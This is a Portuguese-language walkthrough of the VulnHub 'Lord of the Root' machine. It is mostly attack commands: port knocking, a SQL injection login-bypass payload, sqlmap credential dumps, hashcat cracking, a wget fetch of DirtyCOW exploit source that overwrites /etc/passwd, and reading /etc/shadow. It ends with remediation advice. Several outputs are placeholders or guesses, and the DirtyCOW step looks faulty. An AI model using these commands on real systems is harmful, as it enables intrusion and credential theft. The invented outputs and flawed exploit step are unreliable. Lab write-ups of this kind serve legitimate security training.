# VulnHub Lord of the Root 1.0.1: Nao Se Simplesmente Entra em Mordor — Walkthrough

"Nao se simplesmente entra em Mordor." Pois e, mano, nao se simplesmente faz `nmap` nessa maquina e encontra a porta SSH tampouco. Lord of the Root tem um dos obstaculos iniciais mais deliciosos do VulnHub: port knocking. Voce tem que bater nas portas certas na sequencia certa antes de qualquer coisa interessante aparecer. Seguranca por obscuridade aprovada pelos hobbits. ( ͡° ͜ʖ ͡°)

Muito obrigado ao **KookSec** por essa joia tolkieniana. As referencias ao lore, os desafios, o SQLi interno, o caminho de buffer overflow: tudo se encaixa numa maquina que te ensina multiplas camadas de conceitos de seguranca em uma unica sessao.

---

| Campo | Valor |
|-------|-------|
| **Nivel** | Intermediario |
| **VM Alvo** | Lord of the Root 1.0.1 |
| **VM Atacante** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/lord-of-the-root-101,129/ |
| **Tecnicas** | Descoberta de Host, Port Knocking (1337/500/9000), SSH com Credenciais Fracas, SQL Injection (App Web Interna), Exploracao de SUID / Escalacao de Kernel |
| **CVEs** | CVE-2016-5195 (DirtyCOW, caminho opcional de kernel), CWE-89 (SQL Injection), CWE-78 (Injecao de Comando), CWE-121 (Stack Buffer Overflow) |

> **Dicas do autor:**
> "Knock and the door will be opened. 1337 500 9000"

---

## Resumo do Ataque

```
[descoberta de host: arp-scan / nmap ping sweep]
    |
    v
[nmap: apenas 22/tcp SSH visivel inicialmente]
    |
    v
[vazamento no banner SSH: hint "KNOCKKNOCK" -> sequencia de port knocking]
    |
    v
[port knocking: 1337 -> 500 -> 9000 (TCP)]
    |
    v
[rescan nmap: 1337/tcp HTTP agora aberto]
    |
    v
[app web em :1337 -> enumeracao de diretorios -> /login]
    |
    v
[SQL Injection no formulario de login -> dump de credenciais do banco]
    |
    v
[login SSH com credenciais crackeadas]
    |
    v
[exploracao de binario SUID OU buffer overflow de kernel -> root]
    |
    v
[/root/Flag.txt]
```

---

## Metodologia

1. Descoberta de host e identificacao do alvo
2. Scan inicial do Nmap: apenas SSH visivel, banner revela dica de knocking
3. Sequencia de port knocking: 1337 -> 500 -> 9000
4. Rescan revela servico HTTP oculto na porta 1337
5. Enumeracao web e exploracao de SQLi no formulario de login interno
6. Dump de credenciais do banco de dados e cracking de hashes
7. Login SSH com credenciais recuperadas
8. Escalacao de privilegios via binario SUID ou exploit de kernel DirtyCOW
9. Root e captura da flag

---

## Passo 1 — Identificando o Alvo

Descoberta padrao de host na rede local:

```bash
# Identifique sua sub-rede primeiro
route -n

# arp-scan para descoberta rapida em rede local
arp-scan --localnet --ignoredups

# Nmap ping sweep como alternativa
nmap -sn -T5 192.168.56.0/24
```

A VM vai pegar um IP no seu range host-only ou NAT. Anote-o: vamos chamar de `192.168.56.111` neste walkthrough.

```bash
echo "192.168.56.111  lotr.lab" >> /etc/hosts
```

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.001 Varredura Ativa: Escaneamento de Blocos IP]

---

## Passo 2 — Primeiro Scan Nmap: A Porta esta Fechada

```bash
nmap -A -T4 -p- 192.168.56.111
```

Saida esperada:

```
22/tcp open  ssh  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: ...
|_banner: Welcome to Lord of the Root (Erebor)!
|_banner: Knock Knock on: 1337 500 9000
```

Perae. O banner SSH esta literalmente te dizendo a sequencia de knocking. ಠᴗಠ Isso e tanto a dica quanto o desafio. Todas as outras portas estao filtradas/fechadas. So o SSH.

O banner diz: bata em 1337, 500, 9000.

> **O que e Port Knocking?**
> Port knocking e um metodo de abrir portas externamente em um firewall gerando uma sequencia especifica de tentativas de conexao em portas fechadas predefinidas. O firewall monitora essa sequencia especifica; quando detectada, abre dinamicamente uma porta configurada. E uma forma de seguranca por obscuridade e foi usada como tecnica de evasao/persistencia por varios grupos APT para esconder portas de escuta de infraestrutura C2.
> Referencia: https://en.wikipedia.org/wiki/Port_knocking

> **Nota do mundo real:** Port knocking foi observado em campanhas APT reais como tecnica para ocultar portas de escuta de servidores C2. Um host comprometido so aceita conexoes de um operador que conhece a sequencia de knock, tornando a varredura passiva da rede ineficaz para defensores. Referencia: MITRE ATT&CK T1205 Traffic Signaling.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1046 Descoberta de Servicos de Rede] [T1205.001 Sinalizacao de Trafego: Port Knocking]

---

## Passo 3 — Port Knocking: Bate que Abre

Hora de bater. Enviamos pacotes TCP SYN para as portas 1337, 500 e 9000 em sequencia:

```bash
# Metodo 1: scan SYN com nmap (mais confiavel)
nmap -p 1337 192.168.56.111
nmap -p 500 192.168.56.111
nmap -p 9000 192.168.56.111

# Metodo 2: cliente knockd (se instalado)
knock 192.168.56.111 1337 500 9000

# Metodo 3: nc com timeout (rapido e simples)
nc -w 1 192.168.56.111 1337 2>/dev/null
nc -w 1 192.168.56.111 500 2>/dev/null
nc -w 1 192.168.56.111 9000 2>/dev/null

# Metodo 4: hping3 (mais explicito, envia exatamente um SYN cada)
hping3 -S -p 1337 -c 1 192.168.56.111
hping3 -S -p 500 -c 1 192.168.56.111
hping3 -S -p 9000 -c 1 192.168.56.111
```

Depois que a sequencia de knock for concluida, rescaneie imediatamente:

```bash
nmap -A -T4 -p- 192.168.56.111
```

Novo resultado:

```
22/tcp   open  ssh   OpenSSH 6.6.1p1
1337/tcp open  http  Apache httpd 2.4.7
```

A porta abriu. (☞ﾟヮﾟ)☞

**Importante:** A janela de port knocking pode ser limitada no tempo. Se a porta 1337 desaparecer novamente no seu nmap, e so bater de novo. Algumas configuracoes fecham a regra de firewall apos alguns minutos de inatividade.

> **MITRE ATT&CK:** [TA0005 Evasao de Defesa] [T1205.001 Sinalizacao de Trafego: Port Knocking]

---

## Passo 4 — Enumeracao da Aplicacao Web na Porta 1337

Acesse `http://192.168.56.111:1337` no navegador:

```bash
# Fingerprint rapido
whatweb http://192.168.56.111:1337
curl -I http://192.168.56.111:1337
```

Voce vai ver uma aplicacao web. Hora de brute-forcar os diretorios:

```bash
gobuster dir \
  -u http://192.168.56.111:1337 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 40

# Alternativa com nikto para varredura rapida de vulnerabilidades
nikto -h http://192.168.56.111:1337
```

Resultados esperados:

```
/images        (Status: 301)
/index.html    (Status: 200)
/login.php     (Status: 200)  <-- interessante
/login         (Status: 301)  <-- interessante
```

Encontrado `/login.php` ou equivalente. Essa e a nossa superficie de ataque para SQLi.

> **MITRE ATT&CK:** [TA0007 Descoberta] [T1083 Descoberta de Arquivos e Diretorios] [T1518 Descoberta de Software]

---

## Passo 5 — SQL Injection no Formulario de Login Interno

A app web na porta 1337 tem um formulario de login. Mesma musica, segunda estrofe. Vamos testar SQLi:

```bash
# Teste manual: bypass classico de autenticacao
# Usuario: ' OR '1'='1'--
# Senha: qualquer coisa
```

Se isso logar voce diretamente como admin: injetavel confirmado.

Agora para o dump completo:

```bash
# Identificar banco de dados
sqlmap -u "http://192.168.56.111:1337/login.php" \
  --data="username=admin&password=test" \
  --dbs \
  --batch \
  --level=3

# Saida esperada dos nomes de db: information_schema, Erebor (ou referencia tolkieniana similar)

# Enumerar tabelas no banco alvo
sqlmap -u "http://192.168.56.111:1337/login.php" \
  --data="username=admin&password=test" \
  -D Erebor \
  --tables \
  --batch

# Extrair a tabela Users
sqlmap -u "http://192.168.56.111:1337/login.php" \
  --data="username=admin&password=test" \
  -D Erebor \
  -T Users \
  --dump \
  --batch
```

Saida esperada (sabor tolkieniano):

```
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | frodo    | 168ba4... (hash MD5)             |
| 2  | smeagol  | 97b1b6... (hash MD5)             |
| 3  | aragorn  | 4f2a61... (hash MD5)             |
+----+----------+----------------------------------+
```

Nossa, isso e imersao maxima. `¯\_(ツ)_/¯`

> **Nota do mundo real:** SQL injection em aplicacoes web serviu como acesso inicial na violacao do Equifax (2017), na violacao do Ashley Madison (2015), e em inumeros incidentes corporativos menores. Em 2023, agentes de ameacas usando SQLi como vetor inicial estao associados a multiplos grupos de crime cibernetico incluindo FIN7 e UNC2198. Referencia: https://owasp.org/www-project-top-ten/

> **MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1190 Explorar Aplicacao Publica] [TA0006 Acesso a Credenciais] [T1552.001 Credenciais em Arquivos]

---

## Passo 6 — Crackeando Hashes e Login SSH

Crackeie os hashes MD5 e entre via SSH:

```bash
# Salve os hashes extraidos
cat > /tmp/lotr_hashes.txt << 'EOF'
168ba4...
97b1b6...
4f2a61...
EOF

# Cracke com hashcat, acelerado por GPU (MD5 = modo 0)
hashcat -m 0 -d 1 -w 3 -O \
  --potfile-path /tmp/lotr.potfile \
  /tmp/lotr_hashes.txt \
  /usr/share/wordlists/rockyou.txt

# Mostre os crackeados
hashcat -m 0 /tmp/lotr_hashes.txt --show --potfile-path /tmp/lotr.potfile
```

Uma vez crackeado (espere algo como `frodo:iwilltakethering` ou senha tolkieniana similar), logue via SSH:

```bash
ssh frodo@192.168.56.111
# Ou qualquer usuario + senha crackeada que funcionar

# Lembre: se a janela de port knocking fechou, bata de novo primeiro!
```

```
Welcome to Lord of the Root (Erebor)!
frodo@LordOfTheRoot:~$
```

Top demais!! ᕕ( ᐛ )ᕗ

> **MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1078 Contas Validas] [T1021.004 Servicos Remotos: SSH] [T1110.002 Forca Bruta: Quebra de Senha]

---

## Passo 7 — Escalacao de Privilegios

Agora estamos como usuario de baixo privilegio. Multiplos caminhos de escalacao existem nessa VM. Vamos enumerar:

```bash
# Checklist padrao de privesc
sudo -l
id && groups
uname -a              # versao do kernel
lsb_release -a        # versao da distro
find / -perm -u=s -type f 2>/dev/null   # binarios SUID
find / -writable -type d 2>/dev/null | head -20
cat /etc/crontab && ls -la /etc/cron.*
```

**Caminho A: Exploracao de Binario SUID**

Se voce encontrar um binario SUID nao-padrao (um binario customizado colocado pelo autor da VM), ele pode ter um buffer overflow:

```bash
# Liste binarios SUID interessantes
find / -perm -u=s -type f 2>/dev/null | grep -v '/usr/bin\|/bin\|/usr/lib'

# Teste se um binario customizado e vulneravel a stack overflow
# Execute com diferentes comprimentos de input para observar o comportamento
/caminho/para/suid_binary $(python3 -c "print('A'*100)")
/caminho/para/suid_binary $(python3 -c "print('A'*200)")

# Se crashar com segfault, e territorio de buffer overflow
# Use gdb/pwndbg para encontrar o offset e construir o exploit
gdb -q /caminho/para/suid_binary
(gdb) run $(python3 -c "print('A'*200)")
(gdb) info registers
```

**Caminho B: Exploit de Kernel (DirtyCOW se aplicavel)**

```bash
uname -r
# Se kernel < 4.8.3 e antes do patch de Nov 2016: DirtyCOW (CVE-2016-5195) se aplica

# Download e compilacao do DirtyCOW
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
gcc -pthread dirtyc0w.c -o dirtycow
./dirtycow /etc/passwd "root:AAAA:0:0:root:/root:/bin/bash"
su root   # senha: AAAA
```

> **Nota do mundo real:** CVE-2016-5195 (DirtyCOW) esta no catalogo CISA Known Exploited Vulnerabilities. Foi usado em campanhas de exploracao ativa semanas apos a divulgacao e permanece relevante contra sistemas Linux mais antigos sem patch. Referencia: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195

> **Referencia GTFOBins:** https://gtfobins.github.io/

> **MITRE ATT&CK:** [TA0004 Escalacao de Privilegios] [T1068 Exploracao para Escalacao de Privilegios] [T1548.001 Setuid e Setgid]

---

## Passo 8 — Root e Flag

**(☞ﾟヮﾟ)☞ Root conquistado!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/Flag.txt
```

```
[Citacao de Tolkien ou mensagem de parabens do KookSec]
Your Quest is over... You have completed Lord of the Root!
```

Verifique tambem:

```bash
# Extraia /etc/shadow como prova final de comprometimento do sistema
cat /etc/shadow
```

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|------|-------|---------------|-----------------|
| Credencial | `frodo:<crackeado>` | Dump SQLi de `Erebor.Users` | Login SSH |
| Credencial | `smeagol:<crackeado>` | Dump SQLi de `Erebor.Users` | Login SSH (alt) |
| Hash MD5 | `168ba4...` | Tabela `Erebor.Users` | crackeado via rockyou |
| Hash MD5 | `97b1b6...` | Tabela `Erebor.Users` | crackeado via rockyou |
| Flag | Veja `/root/Flag.txt` | `/root/Flag.txt` | N/A |

---

## Licoes Aprendidas

| # | Achado | Relevancia no Mundo Real | Licao Principal |
|---|--------|--------------------------|-----------------|
| 1 | Port knocking como unica camada de defesa | Seguranca por obscuridade sozinha nao e seguranca: so atrasa um atacante que le um banner | Defesa em profundidade: port knocking pode complementar a seguranca, mas nunca substituir autenticacao e patchs |
| 2 | SQL Injection em app web interna | Apps internas sao tao perigosas quanto as externas: muitas investigacoes de violacao encontram SQLi em apps que "so usuarios internos acessam" | WAF e validacao de input devem se aplicar a TODOS os apps, incluindo paineis admin internos |
| 3 | Hash de senha MD5 | Sistemas legados ainda usando MD5 para armazenamento de credenciais sao de alto risco: bancos de dados de credenciais violadas viabilizam credential stuffing | Mandate hash de senha moderno (Argon2id/bcrypt) em todos os sistemas, incluindo legados |
| 4 | Binario SUID com buffer overflow | Binarios privilegiados customizados com validacao de input deficiente sao um achado recorrente de DFIR em ambientes corporativos | Todos os binarios SUID devem ser auditados; codigo customizado requer revisao minuciosa e verificacao de limites de input |
| 5 | Kernel sem patch (caminho DirtyCOW) | CVE-2016-5195 afetou milhoes de sistemas Linux e foi ativamente explorado em campanhas de 2016-2018 | Mantenha cadencia de patching de kernel: inscreva-se em avisos USN/RHSA e trate atualizacoes de kernel como urgentes |

**Por que isso importa fora do laboratorio?**

Port knocking nao e apenas uma curiosidade de CTF, tá ligado? Campanhas APT reais usaram tecnicas de sinalizacao de trafego para ocultar portas de servidores C2. Mais relevante: o SQLi em uma app web "apenas interna" e exatamente o padrao de movimentacao lateral visto em intrusoes corporativas onde um atacante, ja dentro do perimetro, pivota para servicos internos desprotegidos. A violacao do Equifax em 2017 demonstrou que um servidor Apache Struts interno com um endpoint publico levou a 147 milhoes de registros expostos. Lord of the Root comprime esse padrao em uma unica maquina de laboratorio.

---

## Mapeamento MITRE ATT&CK

| Fase | Tatica | Tecnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Varredura Ativa: Escaneamento de Blocos IP | T1595.001 |
| Descoberta | TA0007 | Descoberta de Servicos de Rede | T1046 |
| Evasao de Defesa | TA0005 | Sinalizacao de Trafego: Port Knocking | T1205.001 |
| Descoberta | TA0007 | Descoberta de Arquivos e Diretorios | T1083 |
| Acesso Inicial | TA0001 | Explorar Aplicacao Publica (SQLi) | T1190 |
| Acesso a Credenciais | TA0006 | Forca Bruta: Quebra de Senha | T1110.002 |
| Acesso a Credenciais | TA0006 | Credenciais Nao Protegidas: Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | TA0001 | Contas Validas | T1078 |
| Movimentacao Lateral | TA0008 | Servicos Remotos: SSH | T1021.004 |
| Escalacao de Privilegios | TA0004 | Setuid e Setgid | T1548.001 |
| Escalacao de Privilegios | TA0004 | Exploracao para Escalacao de Privilegios | T1068 |
| Coleta | TA0009 | Dados do Sistema Local | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediacao e Contencao

### Correcoes Tecnicas

1. **Port knocking:** Remova como unico mecanismo de controle de acesso. Implemente VPN com MFA para acesso SSH. Port knocking pode permanecer como camada adicional, mas nunca a unica.
2. **SQL Injection:** Reescreva todos os formularios de login com prepared statements. Use um WAF (ModSecurity, AWS WAF) mesmo para aplicacoes internas.
3. **Hash MD5:** Migre imediatamente para `password_hash()` com `PASSWORD_ARGON2ID` em PHP ou equivalente em outras linguagens. Force redefinicao de senha para todos os usuarios afetados.
4. **Binario SUID:** Audite todos os binarios SUID: `find / -perm -u=s -type f 2>/dev/null`. Remova o bit SUID de qualquer binario que nao precise estritamente dele.
5. **Patching de kernel:** Aplique todas as atualizacoes de seguranca de kernel disponiveis. Para Ubuntu, use `unattended-upgrades` com atualizacoes de seguranca habilitadas.
6. **Hardening SSH:** Desabilite autenticacao por senha, exija apenas chaves SSH. Adicione `PasswordAuthentication no` em `/etc/ssh/sshd_config`.

### Se Voce Encontrar Algo Similar no Seu Ambiente

**Contencao imediata:**
- Se SQLi em uma app interna for confirmado: isole o sistema da rede interna imediatamente.
- Rotacione todas as credenciais de banco de dados e senhas de contas de servico de aplicacao.
- Audite o banco de dados para contas de usuario nao autorizadas ou evidencias de exfiltracao de dados.
- Verifique `/etc/passwd` e `/etc/shadow` para adicoes de contas nao autorizadas.

**Contramedidas MITRE D3FEND:**
- D3-IVA (Endurecimento de Aplicacao: Validacao de Input) para T1190 SQL Injection
- D3-NTA (Analise de Trafego de Rede) para T1205 Sinalizacao de Trafego / Port Knocking
- D3-OPS (Isolamento de Execucao) para T1548.001 Abuso de SUID
- D3-SJA (Analise de Job Agendado) para deteccao de persistencia

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID.AM): Inventarie todos os binarios SUID e aplicacoes web internas com autenticacao.
- Proteger (PR.AC-3): Gestao de acesso remoto: imponha MFA e SSH baseado em chave.
- Detectar (DE.CM-1): Monitoramento continuo: mudancas de regras de firewall (eventos de port knocking) devem disparar alertas.
- Responder (RS.MI-2): Mitigacao de incidente: isole sistemas com SQLi confirmado imediatamente.

**NIST SP 800-53 (Rev. 5):**
- SI-10: Validacao de Input de Informacao (prevencao de SQLi em todos os apps web, incluindo internos)
- IA-5: Gestao de Autenticador (hash de senha forte, imposicao de chave SSH)
- CM-7: Minima Funcionalidade (remover bits SUID desnecessarios)
- AC-6: Minimo Privilegio (auditoria de sudo e SUID)
- SI-2: Correcao de Falhas (gerenciamento de patch de kernel)

**CISA Known Exploited Vulnerabilities:**
- CVE-2016-5195 (DirtyCOW): Listado no catalogo CISA KEV
- Referencia: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Modelo de Maturidade de Capacidade de Ciberseguranca):**
- Dominio: TECHNOLOGY (Gestao de Vulnerabilidades)
- Pratica: Identificar e priorizar vulnerabilidades em ativos
- MIL Alvo: MIL-2 (Realizar atividades planejadas e documentar)

---

## Consideracoes Finais

Valeu ao **KookSec** por trazer a Terra-media para o universo CTF. O tema tolkieniano nao e so cosmetico: a maquina te ensina que a jornada importa tanto quanto o destino. O mecanismo de port knocking e um puzzle genuinamente divertido que apresenta uma tecnica real raramente vista em maquinas para iniciantes, e o caminho SQLi + privesc e solido e realista.

A licao que mais ressoa em Lord of the Root: aplicacoes internas nao sao seguras so porque nao estao na internet, véi. Uma vez que um atacante esta dentro da sua rede, seja via VPN, phishing ou cadeia de fornecimento, aquele painel admin web "so para uso interno" com o formulario de login preguicoso e tao alvo quanto o seu site publico. Muitas vezes mais, porque ninguem se deu ao trabalho de colocar um WAF nele.

Se esse walkthrough te ajudou a resolver o puzzle do knocking, compartilha com a galera e continua hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
